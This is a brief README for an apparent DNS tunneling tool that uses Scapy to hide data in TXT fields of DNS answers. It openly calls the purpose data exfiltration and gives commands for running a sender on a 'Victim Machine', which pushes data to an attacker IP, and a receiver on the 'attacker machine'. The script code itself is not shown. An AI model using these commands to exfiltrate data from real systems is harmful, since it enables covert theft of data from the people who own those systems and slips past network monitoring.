# DNS Tunneling is Fun

Basically speaking, lets say you wanted to exfiltrate some data... why not do it with a TXT field in the answer for a DNS packet

#### Dependancies

1. Scapy

#### Usage

On the Victim Machine

```
sudo python3 dns_tunnel_sender.py -d "Exfiltrate me" -c 5 -s lrl.com -a 192.168.10.5
```

-a is the destination IP

On the attacker machine

```
sudo python3 dns_tunnel_receiver.py
```

 
